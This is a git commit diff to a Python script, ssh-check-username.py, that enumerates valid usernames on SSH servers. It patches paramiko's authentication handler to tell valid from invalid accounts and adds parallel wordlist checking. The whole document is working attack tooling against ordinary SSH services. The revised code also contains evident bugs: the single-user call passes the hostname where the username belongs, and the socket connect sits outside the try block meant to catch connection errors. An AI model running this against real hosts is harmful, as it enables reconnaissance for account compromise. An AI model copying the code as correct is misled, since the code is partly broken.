f2385cf3c3f5012221af17002e283db4c61db4cb
Will Gould <will.gould@cyberis.co.uk>
2018-09-11 14:07:09 +0100

    Working version

--- ssh-check-username.py
+++ ssh-check-username.py
@@ -1,5 +1,8 @@
 #!/usr/bin/python3
-
+import multiprocessing
+import threading
+import time
+import os
 import argparse
 import logging
 import paramiko
@@ -7,15 +10,14 @@ import socket
 import sys
 import pdb
 
-
 arg_parser = argparse.ArgumentParser()
 arg_parser.add_argument('-t',dest='hostname', type=str, help='Single target')
 arg_parser.add_argument('-p',dest='port', type=int, default=22, help='port to connect on: Default port is 22')
 arg_parser.add_argument('-u',dest='username', type=str, help='username you want to enumerate')
-arg_parser.add_argument('-l',dest='Target_List', help='multiple targets to enumerate over')
 arg_parser.add_argument('-w',dest='wordlist', help='enumerate multiple users')
 args = arg_parser.parse_args()
 port = args.port
+target = args.hostname
 
 class InvalidUsername(Exception):
     pass
@@ -37,33 +39,27 @@ def userauth_failure(*args, **kwargs):
     raise InvalidUsername()
 
 
-def ssh_sock(target, username, *args, **kwargs):
-    with socket.socket() as sock:
-        try:
-            sock.connect((target, port))
-        except socket.error:
-            print ('[-] Failed to connect')
-            sock.close()
-            return
-
+def _paramiko_tunnel(username, *args, **kwargs):
+    sock = socket.socket()
+    sock.connect((target, port))
+    us = username.strip()
+    try:
         transport = paramiko.transport.Transport(sock)
-        
-        try:
-            transport.start_client()
-        except paramiko.ssh_exception.SSHException:
-            print ('[-] Failed to negotiate SSH transport')
-            return
-        except EOFError:
-            print("EOFError encountered with host: {}".format(target))
-            return
-
-        try:
-            transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
-        except InvalidUsername:
-            print ('[*] {} - Invalid username'.format(username))
-        except paramiko.ssh_exception.AuthenticationException:
-            print ('[+] {} - Valid username'.format(username))
-            return
+    except socket.error:
+        print ('[-] Failed to connect')
+        return
+    try:
+        transport.start_client()
+    except paramiko.ssh_exception.SSHException:
+        print ('[-] Failed to negotiate SSH transport')
+        return
+    try:
+        transport.auth_publickey(us, paramiko.RSAKey.generate(2048))
+    except InvalidUsername:
+        print ('[*] {} - Invalid username'.format(us))
+    except paramiko.ssh_exception.AuthenticationException:
+        print ('[+] {} - Valid username'.format(us))
+        return
 
 
 paramiko.auth_handler.AuthHandler._handler_table.update({
@@ -75,20 +71,17 @@ logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
 if args.username is not None:
     username = args.username
-    if args.hostname is not None:
-        target = args.hostname
-        ssh_sock(target, username)
-    elif args.Target_List is not None:
-        with open(args.Target_List) as f:
-            for target in f:
-                ssh_sock(target, username)
+    _paramiko_tunnel(target, port, username)
+
 if args.wordlist is not None:
-    with open(args.wordlist) as w:
-        for user in w:
-            if args.hostname is not None:
-                target = args.hostname
-                ssh_sock(target, user.rstrip('\n'))
-            elif args.Target_List is not None:
-                with open(args.Target_List) as f:
-                    for target in f:
-                        ssh_sock(target, user)
+    usernames = []
+    mp = []
+    pool = multiprocessing.Pool(5)
+    with open(args.wordlist) as f:
+        for u in f:
+            usernames.append(u)
+        pool.map(_paramiko_tunnel, usernames)
+
+        
+
+
